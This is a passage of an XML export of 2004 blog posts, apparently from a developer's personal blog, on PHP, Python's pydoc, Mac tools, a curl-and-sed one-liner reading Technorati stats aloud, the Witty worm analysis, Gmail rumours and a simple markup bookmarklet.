&lt;p&gt;One thing that I would like to see addressed with the full release of &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; 5 is the increasing fragmentation of the &lt;a href=&quot;http://www.php.net/manual/&quot;&gt;PHP manual&lt;/a&gt;. The single online manual now covers every version of &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; from 3 upwards, making it increasingly difficult to use effectively if you are targetting older versions of &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;. The Python site maintains archived versions of &lt;a href=&quot;http://www.python.org/doc/versions.html&quot;&gt;previous documentation snapshots&lt;/a&gt;, making it easy to  refer to the documentation of the version of the language you are using. With the major changes between versions 4 and 5 of &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; a similar approach could be highly beneficial.&lt;/p&gt;</field>
		<field name="created">2004-03-21 21:34:09</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1378</field>
		<field name="title">Pydoc</field>
		<field name="slug">pydoc</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.python.org/doc/current/lib/module-pydoc.html&quot;&gt;Pydoc&lt;/a&gt; is awesome; I don't know how I missed it for so long. Simply type the following at the command line:&lt;/p&gt;

&lt;p&gt;&lt;samp&gt;pydoc -p 8888&lt;/samp&gt;&lt;/p&gt;

&lt;p&gt;Then point a browser at &lt;samp&gt;http://localhost:8888/&lt;/samp&gt; to browse interactive documentation for every Python module available on your system. This includes moduldes installed in your site-packages directory. If you keep code you've written yourself in site-packages you'll be able to browse the documentation for that too. If you're even remotely consistent about writing docstrings you'll be amazed at how useful the resulting documentation is. I can't believe I only just discovered this!&lt;/p&gt;</field>
		<field name="created">2004-03-23 22:43:35</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1379</field>
		<field name="title">Quicksilver</field>
		<field name="slug">quicksilver</field>
		<field name="body">&lt;p&gt;I found out about &lt;a href=&quot;http://blacktree.com/apps/quicksilver/&quot;&gt;Quicksilver&lt;/a&gt; via &lt;a href=&quot;http://www.sauria.com/blog/2004/03/22#872&quot; title=&quot;PyCon sprints, day 2, dinner&quot;&gt;Ted Leung&lt;/a&gt; a couple of days ago, and it's already become an indispensable part of my OS X desktop. On the surface, Quicksilver is very similar to &lt;a href=&quot;http://www.obdev.at/products/launchbar/&quot;&gt;LaunchBar&lt;/a&gt; which I'd tried and liked but not enough to justify the price tag. LaunchBar lets you launch any application on your system by hitting CMD+space and typing enough of the name to highlight the application you want. Quicksilver takes the same idea but expands it to cover address book entries, iTunes playlists, documents, bookmarks and more. It's incredibly slick, highly configurable and doesn't cost a penny.&lt;/p&gt;

&lt;p&gt;It's also being blogged to death at the moment, but it's so good it really deserves the attention. See also &lt;a href=&quot;http://whatdoiknow.org/archives/001601.shtml&quot; title=&quot;OS X Software: Quicksilver&quot;&gt;Todd Dominey&lt;/a&gt;, &lt;a href=&quot;http://www.hicksdesign.co.uk/journal/archives/000420.php&quot; title=&quot;Quicksilver for OS X&quot;&gt;Jon Hicks&lt;/a&gt;, Dan Dickinson's &lt;a href=&quot;http://vjarmy.com/archives/000620.php&quot; title=&quot;QuickSilver - A Better OS X In Just 10 Minutes&quot;&gt;useful tutorial&lt;/a&gt; and the cast of &lt;a href=&quot;http://www.technorati.com/cosmos/search.html?url=http%3A%2F%2Fblacktree.com%2Fapps%2Fquicksilver%2F&quot; title=&quot;Technorati: Search for http://blacktree.com/apps/quicksilver/&quot;&gt;Technorati&lt;/a&gt; and &lt;a href=&quot;http://www.feedster.com/search.php?q=quicksilver&quot; title=&quot;Feedster Search: quicksilver&quot;&gt;Feedster&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2004-03-26 00:13:15</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1380</field>
		<field name="title">Abusing the command line</field>
		<field name="slug">abusing</field>
		<field name="body">&lt;p&gt;If you're running OS X, try this:&lt;/p&gt;

&lt;p&gt;&lt;samp&gt;say -v Kathy `curl --silent http://api.technorati.com/getinfo?username=simonwillison | grep '&amp;lt;inbound' | sed -e 's/    &amp;lt;//' | sed -e 's/inboundblogs&amp;gt;/Simons blog has /' | sed -e 's/&amp;lt;\/inboundblogs&amp;gt;/ inbound blogs and /' | sed -e 's/inboundlinks&amp;gt;//' | sed -e 's/&amp;lt;\/inboundlinks&amp;gt;/ inbound links/'`&lt;/samp&gt;&lt;/p&gt;

&lt;p&gt;Your computer should read out to you my Technorati inbound blogs and inbound links, extracted from the Technorati web &lt;acronym title=&quot;Applications Programming Interface&quot;&gt;API&lt;/acronym&gt;. Parsing &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; using sed is a nasty trick I picked up from &lt;a href=&quot;http://www.macdevcenter.com/pub/a/mac/2004/03/12/rss_scripting.html&quot; title=&quot;Tapping RSS with Shell Scripts&quot;&gt;this O'Reilly article&lt;/a&gt;; speaking the output of a command using the 'say' and the backtick shell operator was my moment of inspiration for the day.&lt;/p&gt;</field>
		<field name="created">2004-03-26 01:28:43</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1381</field>
		<field name="title">Conferences with Macs</field>
		<field name="slug">conferences</field>
		<field name="body">&lt;p&gt;Three reasons Macs make excellent companions to geek-centric conferences:&lt;/p&gt;

&lt;ol&gt;
 &lt;li&gt;&lt;strong&gt;iChat and Rendezvous&lt;/strong&gt;. &lt;a href=&quot;http://www.apple.com/ichat/&quot;&gt;iChat&lt;/a&gt; uses &lt;a href=&quot;http://www.apple.com/macosx/features/rendezvous/&quot;&gt;Rendezvous&lt;/a&gt; (aka zero configuration networking) to automatically display a list of all other iChat users on the same network as you. In a conference setting this can be a great way of seeing who's around - I met a couple of people at SxSW who I'd been hoping to run in to by co-ordinating a metting via iChat. A few panelists even used iChat to take questions during their panels. Here's &lt;a href=&quot;http://simon.incutio.com/images/2004/rendezvous-at-sxsw.png&quot;&gt;a screenshot of iChat Rendezvous&lt;/a&gt; taken during SxSW.&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;&lt;a href=&quot;http://www.codingmonkeys.de/subethaedit/&quot;&gt;SubEthaEdit&lt;/a&gt;&lt;/strong&gt;, which really has to be seen to be believed. I made a half hearted attempt to get a SubEthaEdit session going at SxSW but failed to achieve critical mass. Ted Leung at PyCon &lt;a href=&quot;http://www.sauria.com/blog/2004/03/25#876&quot; title=&quot;PyCon, Day 1&quot;&gt;seems to have got it sussed&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;&lt;a href=&quot;http://www.etherpeg.org/&quot;&gt;EtherPEG&lt;/a&gt;&lt;/strong&gt;. This isn't as essential as the other two but can be a lot of fun - it's an ethical (as in it doesn't steal anything important) network sniffer which displays a selection of images currently being transferred across the network. It provides an often surreal insight in to the browsing habits of other conference goers.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;I remember hearing Mac owners complain of being treated like second-class citizens. I haven't felt like that once in nearly three months of owning a Mac.&lt;/p&gt;</field>
		<field name="created">2004-03-26 03:55:04</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1382</field>
		<field name="title">It's only going to get worse</field>
		<field name="slug">notSoWitty</field>
		<field name="body">&lt;p&gt;This analysis of &lt;a href=&quot;http://www.caida.org/analysis/security/witty/&quot;&gt;the spread of the witty worm&lt;/a&gt; is fascinating for a whole bunch of different reasons.&lt;/p&gt;

&lt;p&gt;Firstly, the analysis was made possible by USCD's Network Telescope, a network monitoring system on a massive scale which takes advantage of the fact that IP arranges were &lt;a href=&quot;http://euclid.math.brandeis.edu/turtschi/whois/neta1.html&quot; title=&quot;List of Class A Networks&quot;&gt;handed out like candy&lt;/a&gt; back when the 'net was in its infancy. USCD controls a huge chunk of all potential IPv4 addresses, and their network telescope tracks data sent to 1/256th of all IPv4 traffic. Since most worms target random IP addresses this makes the telescope a unique tool in analysing the spread of hostile code in the wild.&lt;/p&gt;

&lt;p&gt;Next, Witty Worm was no ordinary worm. It targeted an exploit in &lt;a href=&quot;http://www.iss.net/&quot;&gt;ISS&lt;/a&gt; firewall products, which include the popular &lt;a href=&quot;http://blackice.iss.net/&quot;&gt;BlackICE&lt;/a&gt; product targeted at home users; this means the worm was actively attacking people who had made an effort to secure their machines! It also carried a destructive payload - a rarity for worms in the wild. Additionally, the exploit it used had only been publically announced the day before. It's possible the authors new of the vulnerability in advance, but it's far more likely they had already written the payload and were just waiting for a new vulnerability to use as the carrier.&lt;/p&gt;

&lt;p&gt;From reading the report, it seems that the worm managed to infect virtually every one of its potential targets that were connected to the internet. This critical point is what makes the worm so interesting, because it destroys the idea that non-Windows users are made more secure by  their relatively lesser numbers. If a worm came out with a similar methodology to Witty Worm but that targeted Linux, OS X or even something with a truly tiny statistical footprint like BeOS it could still achieve almost total infection of its chosen target audience.&lt;/p&gt;

&lt;p&gt;The worm also appears to have used a number of techniques that had previously been hypothesized by the security communit, such as spreading from a number of pre-infected hosts.&lt;/p&gt;

&lt;p&gt;If a worm can spread this fast, with this little notice, and infect almost all of the vulnerable population, we're in a pretty precarious state.&lt;/p&gt;

&lt;p&gt;Related reading: &lt;a href=&quot;http://m.bacarella.com/papers/secsoft/html/&quot;&gt;The Peon's Guide to Secure System Development&lt;/a&gt;, Slashdot's &lt;a href=&quot;http://slashdot.org/articles/04/03/26/0140254.shtml&quot; title=&quot;Analysis of the Witty Worm&quot;&gt;thread on the Witty Worm analysis&lt;/a&gt; (some of the +5 comments are pretty good).&lt;/p&gt;</field>
		<field name="created">2004-03-27 00:32:59</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1383</field>
		<field name="title">Omit needless words, codified</field>
		<field name="slug">omit</field>
		<field name="body">&lt;p&gt;I continue to try to improve my writing. &quot;Omit needless words&quot; is all well and good, but identifying needless words can be a difficult task for the untrained eye. Paul Ford's &lt;a href=&quot;http://www.ftrain.com/ThePassivator.html&quot;&gt;Passivator&lt;/a&gt; bookmarklet highlights adverbs and passive verbs, both of which can indicate weak writing.&lt;/p&gt;</field>
		<field name="created">2004-03-27 22:06:00</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1384</field>
		<field name="title">PHP and Apache 2.0</field>
		<field name="slug">phpAndApache2</field>
		<field name="body">&lt;p&gt;For as long as Apache 2 has been stable, the &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; manual has carried this &lt;a href=&quot;http://www.php.net/manual/en/install.apache2.php&quot;&gt;strongly worded warning&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.php.net/manual/en/install.apache2.php&quot;&gt;&lt;p&gt;Do not use Apache 2.0 and PHP in a production environment neither on Unix nor on Windows.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;I've frequently wondered why they are being so slow to support the new version  - after all, Apache 2 provides &lt;a href=&quot;http://httpd.apache.org/docs-2.0/new_features_2_0.html&quot; title=&quot;Overview of new features in Apache 2.0&quot;&gt;a bunch of improvements&lt;/a&gt; over the older 1.3 and is recommended by the Apache Software Foundation as the &lt;q cite=&quot;http://httpd.apache.org/download.cgi&quot;&gt;best available version&lt;/q&gt;.&lt;/p&gt;

&lt;p&gt;I finally found the answer today in &lt;a href=&quot;http://apache.slashdot.org/comments.pl?sid=101407&amp;amp;cid=8644732&quot;&gt;this comment&lt;/a&gt; buried on Slashdot. It seems that one of the key features of Apache 2 is the new &lt;a href=&quot;http://httpd.apache.org/docs-2.0/mod/worker.html&quot;&gt;threaded worker module&lt;/a&gt; which uses threads to serve more requests more efficiently than 1.3's multi-process based server. While the core Zend engine of &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; is thread-safe many of the critical libraries that &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; relies on for its advanced functionality (image processing, database connectivity and so forth) are not, and are unlikely to become so any time in the future. In a threaded environment &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; is likely to suffer from all kinds of unpredictable bugs. Apache 2 can be run in traditional 1.3-style &lt;a href=&quot;http://httpd.apache.org/docs-2.0/mod/prefork.html&quot;&gt;prefork mode&lt;/a&gt; but doing so greatly reduces its advantages over 1.3. Combined with the lack of heavy duty testing on Apache 2 and the fact that the 1.3 series will continue to be supported for a long time to come it's clear why the &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; team are unwilling to recommend &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; and Apache 2 in a production environment.&lt;/p&gt;</field>
		<field name="created">2004-03-31 07:43:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1385</field>
		<field name="title">1GB of webmail from Google</field>
		<field name="slug">googleWebmail</field>
		<field name="body">&lt;p&gt;Provided &lt;a href=&quot;http://news.com.com/2100-1032_3-5182805.html?tag=nefd_top&quot; title=&quot;Google to offer gigabyte of free e-mail&quot;&gt;this story&lt;/a&gt; about a new 1 GB webmail service from Google isn't a lame early April fool, I'm really psyched about it. A decent amount of space combined with Google's search technology could really help me keep up to date with my email. Just off the top of my head, here's my ideal hosted webmail feature list:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;Costs between two and ten dollars a month. This is a critical service I'm entrusting to a company - I want the reassurance that there's cold hard cash on the line if they screw anything up. Paying for a no-ads option is fine too.&lt;/li&gt;
 &lt;li&gt;Smart filtering. I'm on a bunch of different mailing lists and can't live without filters.&lt;/li&gt;
 &lt;li&gt;&quot;Virtual folders&quot; - things like &quot;all emails from this person&quot;, &quot;emails sent to this person&quot; should be on hand at all times.&lt;/li&gt;
 &lt;li&gt;Import and export mail as mbox files. Don't lock me in!&lt;/li&gt;
 &lt;li&gt;Decent spam filtering, obviously.&lt;/li&gt;
 &lt;li&gt;Send plain text, receieve plain text. No &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; in either direction.&lt;/li&gt;
 &lt;li&gt;Kick-arse search.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I don't really have very complex needs, which is why I'm so frustrated that so far nothing I've tried has done what I need it to. Here's hoping Google can hit the mark.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt; The Google &lt;a href=&quot;http://www.google.com/press/pressrel/gmail.html&quot; title=&quot;Google Gets the Message, Launches Gmail&quot;&gt;press release&lt;/a&gt; is dated April 1st. Given &lt;a href=&quot;http://www.google.com/technology/pigeonrank.html&quot; title=&quot;Pigeon Rank&quot;&gt;their history&lt;/a&gt;, it's almost certainly a hoax. Aah well, we can dream.&lt;/p&gt;</field>
		<field name="created">2004-04-01 02:35:15</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1386</field>
		<field name="title">Thanks a bundle, HP</field>
		<field name="slug">hpsux</field>
		<field name="body">&lt;p&gt;I needed to scan a couple of signed documents at work, as a cheaper alternative to locating a fax machine. The office scanner is an HP scanjet 4570c. I plugged it in to the back of my PowerBook to see if it would work straight away, as pretty much everything else I've plugged in has. It didn't. Fair enough, I can't expect Apple to pre-install drivers for &lt;em&gt;everything&lt;/em&gt;. So I headed over to HP's site to grab the necessary software.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://h20015.www2.hp.com/en/softwareList.jhtml?reg=&amp;amp;cc=us&amp;amp;prodId=hpscanjet477368&amp;amp;lc=en&amp;amp;plc=&amp;amp;softitem=Mac%20OS%20X&amp;amp;sw_lang=en&amp;amp;pagetype=software&quot;&gt;All 170 MB of it!&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Opera 7 is 3.8 MB. FireFox is 10 MB. Heck, the whole Mozilla suite is only 15 MB. What on earth could a scanner need that's more than ten times the size of Mozilla?&lt;/p&gt;

&lt;p&gt;So I gritted my teeth and proceeded with the download. Ten minutes later (thank goodness for broadband) the installer started up, and cheerfully told me I would have to quit all of my applications so it could restart my machine. If I clicked OK, it would shut them all down for me before proceeding with the install. Definitely no chance of me doing some useful work while it was copying over 7,000 files around my computer. Who needs multi-tasking anyway?&lt;/p&gt;

&lt;p&gt;Gngngnngngng.&lt;/p&gt;

&lt;p&gt;Another ten minutes later (I run a lot of apps) and the installer's off on its merry way. A while after that it restarts my Mac. Time to see why goodies HP has provided:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;HP Photo and Imaging Director (added to my Dock, thanks for asking(!))&lt;/li&gt;
 &lt;li&gt;HP Photo and Imaging Gallery&lt;/li&gt;
 &lt;li&gt;HP Quick Print&lt;/li&gt;
 &lt;li&gt;HP E-mail Portal&lt;/li&gt;
 &lt;li&gt;HP PrecisionScan Pro&lt;/li&gt;
 &lt;li&gt;HP ScanJet Copy Utiliy&lt;/li&gt;
 &lt;li&gt;HP ScanJet Manager&lt;/li&gt;
 &lt;li&gt;HP Scanner Preferences&lt;/li&gt;
 &lt;li&gt;ScanLaunch&lt;/li&gt;
 &lt;li&gt;HP Send To Application&lt;/li&gt;
 &lt;li&gt;HP Share-to-Web&lt;/li&gt;
 &lt;li&gt;Memories Disc&lt;/li&gt;
 &lt;li&gt;HP WebUpdate&lt;/li&gt;
 &lt;li&gt;Readiris 7 Pro (&lt;acronym title=&quot;Optical Character Recognition&quot;&gt;OCR&lt;/acronym&gt; software)&lt;/li&gt;
 &lt;li&gt;HP Uninstaller&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I took a guess and fired up Imaging Director, taking the addition to my Dock as a clue that this was the best place to start. Options included &quot;Scan Picture&quot; and &quot;Scan Document&quot;. &quot;Scan Document&quot; launched the &lt;acronym title=&quot;Optical Character Recognition&quot;&gt;OCR&lt;/acronym&gt; software, then promptly crashed. &quot;Scan Picture&quot; managed to scan the image, dropping it in to Imaging Gallery. It wasn't at all obvious what Imaging Gallery was actually for, so I dragged the scan back out of it, opened it in my own choice of image software and did what I needed to do.&lt;/p&gt;

&lt;p&gt;I'm now left with 170 MB of useless, apparently buggy software. Thank goodness for the uninstaller. Does using a scanner really have to involve this much hassle?&lt;/p&gt;</field>
		<field name="created">2004-04-01 03:10:41</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1387</field>
		<field name="title">Microsoft &quot;get&quot; blogging</field>
		<field name="slug">aPositiveEntryAboutMicrosoft</field>
		<field name="body">&lt;p&gt;Who would have thought a year ago that Microsoft would be the company that took corporate blogging to the next level? Say what you like about the company itself, you can't fault the quality and quantity of bloggers coming out of Redmond at the moment. Yesterday I stumbled across this &lt;a href=&quot;http://blogs.msdn.com/jobsblog/&quot; title=&quot;Technical Careers @ Microsoft&quot;&gt;fascinating blog&lt;/a&gt; that provides an insight in to Microsoft's recruitment techniques. If you're looking for a job at a high-tech company you can't afford &lt;em&gt;not&lt;/em&gt; to read this - they already have &lt;a href=&quot;http://weblogs.asp.net/jobsblog/category/4364.aspx&quot; title=&quot;Resume Tips&quot;&gt;a bunch of resume advice&lt;/a&gt;, tips on &lt;a href=&quot;http://blogs.msdn.com/jobsblog/archive/2004/04/01/105933.aspx&quot; title=&quot;What to wear ...aka Recruiter eye for the Tech guy&quot;&gt;what to wear to interviews&lt;/a&gt; and posts on subjects such as employee referrals, international recriting, phone screening and more.&lt;/p&gt;

&lt;p&gt;The authors are two Microsoft recruiters and display an incredible enthusiasm for their work, which is probably what makes the blog such a great read. It's fun to compare their more recent entries with &lt;a href=&quot;http://weblogs.asp.net/jobsblog/archive/2004/03/12/88834.aspx&quot; title=&quot;Welcome to the &amp;quot;Technical Careers @ Microsoft&amp;quot; blog!&quot;&gt;their opening entry&lt;/a&gt;, which Robert Scoble rightly &lt;a href=&quot;http://radio.weblogs.com/0001011/2004/03/12.html#a6970&quot; title=&quot;I&amp;apos;m too arrogant, friend says, and new Microsoft bloggers pop up&quot;&gt;criticised&lt;/a&gt; as being far too corporate. The great tragedy of the official &lt;a href=&quot;http://www.georgewbush.com/blog/&quot; title=&quot;GeorgeWBush.com :: Official Blog&quot;&gt;Bush&lt;/a&gt; and &lt;a href=&quot;http://blog.johnkerry.com/&quot; title=&quot;John Kerry for President Blog&quot;&gt;Kerry&lt;/a&gt; blogs is that they frequently read like glorified press releases. One of the core messages of the &lt;a href=&quot;http://www.cluetrain.com/&quot;&gt;Cluetrain Manifesto&lt;/a&gt; is that people want to be communicated with in a human voice. I don't know if the Microsoft recruiters have read it, but they've certainly taken that core value to heart.&lt;/p&gt;</field>
		<field name="created">2004-04-05 00:11:06</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1388</field>
		<field name="title">Personalisation? We've already got it</field>
		<field name="slug">blogsAsFilters</field>
		<field name="body">&lt;p&gt;Vin Crosbie, a highly respected commentator on the online news industry, recently published his long awaited essay &lt;a href=&quot;http://www.ojr.org/ojr/business/1078349998.php&quot;&gt;What Newspapers and Their Web Sites Must Do to Survive&lt;/a&gt;. It's long but captivating and well researched; if you have any interest in the role of traditional newspapers on the web you should take the time to read it.&lt;/p&gt;

&lt;p&gt;Vin believes that customisation of both online and offline editions to serve reader's individual interests is critical to the survival of big-J media. He makes an excellent case; the problem is we are already there.&lt;/p&gt;

&lt;p&gt;I would guess that at least 90% of my news intake comes from reading blogs - the 130 blogs you can see listed in the sidebar on my front page. That's not to say that I only read 130 sites - blogging is about linking, and those 130 sites in turn link me out to a huge network of news sources around the web. The blogs I read work as the ultimate personalised filtering mechanism: I read them because their authors have similar interests to me, and are the people most likely to direct me to content that I will personally find interesting.&lt;/p&gt;

&lt;p&gt;No computerised system could possibly compete with 130 hand-picked human editors, working around the clock to channel interesting information in my direction. Blogs are conversations, but they are also filters. Never before in my life have I had to invest so little effort in finding so much diverse  and fulfilling content. As a certified infovore I don't know how I survived without them.&lt;/p&gt;

&lt;p&gt;What this means for traditional news media is anyone's guess. It's certainly not going to die out: someone has to collect the news and there's only so much unpaid bloggers can do in that regard. We certainly live in interesting times.&lt;/p&gt;

&lt;p&gt;As an aside, if you're interested in online media you should read Steve Yelvington's essay &lt;a href=&quot;http://www.yelvington.com/item.php?id=404&quot;&gt;Ten years in new media: Looking back, looking forward&lt;/a&gt;, which includes a call to arms to the online news industry to get over the novelty of new technology and finally start taking advantage of it.&lt;/p&gt;</field>
		<field name="created">2004-04-05 01:20:41</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1389</field>
		<field name="title">What is Google?</field>
		<field name="slug">whatIsGoogle</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://battellemedia.com/archives/000536.php&quot; title=&quot;Skrenta Groks The Google Platform OS&quot;&gt;John Battelle&lt;/a&gt;, Rick Skrenta's &lt;a href=&quot;http://blog.topix.net/archives/000016.html&quot; title=&quot;The Secret Source of Google&amp;apos;s Power&quot;&gt;remarkable piece&lt;/a&gt; on what Google have actually built. They don't just have the world's best search engine, they have the world's largest and most scalable platform for developing huge web-based applications.&lt;/p&gt;

&lt;blockquote cite=&quot;http://blog.topix.net/archives/000016.html&quot;&gt;
&lt;p&gt;Google has taken the last 10 years of systems software research out of university labs, and built their own proprietary, production quality system. What is this platform that Google is building? It's a distributed computing platform that can manage web-scale datasets on 100,000 node server clusters. It includes a petabyte, distributed, fault tolerant filesystem, distributed RPC code, probably network shared memory and process migration. And a datacenter management system which lets a handful of ops engineers effectively run 100,000 servers. Any of these projects could be the sole focus of a startup.&lt;/p&gt;

&lt;p&gt;[ ... ]&lt;/p&gt;

&lt;p&gt;While competitors are targeting the individual applications Google has deployed, Google is building a massive, general purpose computing platform for web-scale programming.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Fascinating stuff.&lt;/p&gt;</field>
		<field name="created">2004-04-05 08:06:09</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1390</field>
		<field name="title">Glastonbury screw-up</field>
		<field name="slug">screwup</field>
		<field name="body">&lt;p&gt;I went &lt;a href=&quot;http://simon.incutio.com/archive/2003/04/01/glastonburySoldOut&quot; title=&quot;Glastonbury sold out&quot;&gt;last year&lt;/a&gt;, I went &lt;a href=&quot;http://simon.incutio.com/archive/2002/06/26/goneToGlastonbury&quot; title=&quot;Gone to Glastonbury&quot;&gt;the year before&lt;/a&gt;, I'm pretty sure I went the year before that, but &lt;em&gt;this&lt;/em&gt; year I'm staying home. The &lt;a href=&quot;http://www.aloud.com/&quot;&gt;muppets&lt;/a&gt; running the online ordering system apparently decided that &lt;a href=&quot;http://www.theregister.co.uk/2004/04/05/glastonbury_blames_bt/&quot; title=&quot;Glastonbury blames BT for ticket sale fiasco&quot;&gt;a couple of Windows 2000 servers&lt;/a&gt; could handle 130,000 ticket sales in 24 hours. They got hit by 2,000,000 hits in the first five minutes. Admitedly, that's going to be tough for anything to handle (maybe it's a job for &lt;a href=&quot;http://simon.incutio.com/archive/2004/04/05/whatIsGoogle&quot; title=&quot;What is Google?&quot;&gt;Google's super-platform&lt;/a&gt;) but after last year's 23 hour sell out anyone could have told them this year was going to be a whole lot tougher.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://news.bbc.co.uk/1/hi/entertainment/music/3595387.stm&quot; title=&quot;Fans snap up Glastonbury tickets&quot;&gt;This BBC article&lt;/a&gt; has plenty of stories that match my own. I tried persistently over the space of 12 hours, filled out the form multiple times, was repeatedly told the tickets were all sold out when I knew that they weren't and finally received a screen telling me I'd made it. The confirmation email never turned up. Bloody marvelous.&lt;/p&gt;

&lt;p&gt;I just hope they sort out a sane way of distributing the tickets for next year.&lt;/p&gt;</field>
		<field name="created">2004-04-06 03:02:06</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1391</field>
		<field name="title">Missed opportunity</field>
		<field name="slug">opportunity</field>
		<field name="body">&lt;p&gt;Apple are missing out on a huge opportunity. I've bought 198 songs through the &lt;a href=&quot;http://www.apple.com/itunes/store/&quot;&gt;iTunes music store&lt;/a&gt; now, and iTunes has access to the other music that I've imported from my own &lt;acronym title=&quot;Compact Disc&quot;&gt;CD&lt;/acronym&gt; collection. I want to discover new music - why doesn't iTunes look at what I listen to, match it against buying habits tracked through the store and give me an Amazon style &quot;people who like the music you listen to also liked...&quot;. Privacy concerns could be avoided by having the recommendation feature off by default - I'd turn it on in a heart-beat.&lt;/p&gt;</field>
		<field name="created">2004-04-08 00:09:07</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1392</field>
		<field name="title">A myriad of markup systems</field>
		<field name="slug">myriadOfMarkupSystems</field>
		<field name="body">&lt;p&gt;It's hard to avoid the legions of custom markup systems out there these days. Every Wiki has it's own syntactical quirks, while packages like &lt;a href=&quot;http://daringfireball.net/projects/markdown/&quot;&gt;Markdown&lt;/a&gt;, &lt;a href=&quot;http://www.textism.com/tools/textile/&quot;&gt;Textile&lt;/a&gt;, &lt;a href=&quot;http://pear.php.net/pepr/pepr-bbcode-help.php&quot;&gt;BBCode&lt;/a&gt; (in dozens of variants), &lt;a href=&quot;http://docutils.sourceforge.net/rst.html&quot;&gt;reStructuredText&lt;/a&gt; offer easy ways of hooking markup conversion in to existing applications. When it comes to being totally over-implemented and infuratingly inconsistent, markup systems are rapidly catching up with template packages. Never one to miss out on an opportunity to reinvent the wheel, I've worked on several of each ;)&lt;/p&gt;

&lt;p&gt;My most recent markup handling attempt has just been published as part of my &lt;a href=&quot;http://www.sitepoint.com/article/bookmarklets&quot; title=&quot;Better Living Through Bookmarklets&quot;&gt;SitePoint article on Bookmarklets&lt;/a&gt; (&lt;a href=&quot;http://www.google.com/search?q=%22better+living+through+*%22&quot;&gt;cliché&lt;/a&gt;). It's a structured markup language in a bookmarklet: activate the bookmarklet to convert the text in any textarea on a page to &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt;. The syntax is ridiculously simple, and serves my limited needs just fine:&lt;/p&gt;

&lt;pre&gt;&lt;samp&gt;
= This is a header

Here is a paragraph.

* This is a list of items
* Another item in the list
&lt;/samp&gt;&lt;/pre&gt;

&lt;p&gt;Converts to:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;xhtml&quot;&gt;
&amp;lt;h4&amp;gt;This is a header&amp;lt;/h4&amp;gt;

&amp;lt;p&amp;gt;Here is a paragraph.&amp;lt;/p&amp;gt;

&amp;lt;ul&amp;gt;
 &amp;lt;li&amp;gt;This is a list of items&amp;lt;/li&amp;gt;
 &amp;lt;li&amp;gt;Another item in the list&amp;lt;/li&amp;gt;
&amp;lt;/ul&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The algorithm is simple, and easily portable to any language you care to mention:&lt;/p&gt;

&lt;ol&gt;
 &lt;li&gt;Normalise newlines to \n, for cross-platform consistency.&lt;/li&gt;
 &lt;li&gt;Split the text up on double newlines, to create a list of blocks.&lt;/li&gt;
 &lt;li&gt;For each block:
 &lt;ol&gt;
  &lt;li&gt;If it starts with an equals sign, wrap it in header tags.&lt;/li&gt;
  &lt;li&gt;If it starts with an asterisk, split it in to lines, make each a list item (stripping off the asterisk at the start of the line if required) and glue them all together inside a &lt;code class=&quot;xhtml&quot;&gt;&amp;lt;ul&amp;gt;&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Otherwise, wrap it in a &lt;code class=&quot;xhtml&quot;&gt;&amp;lt;p&amp;gt;&lt;/code&gt; tag &lt;em&gt;provided it doesn't have one already&lt;/em&gt;.&lt;/li&gt;
 &lt;/ol&gt;&lt;/li&gt;
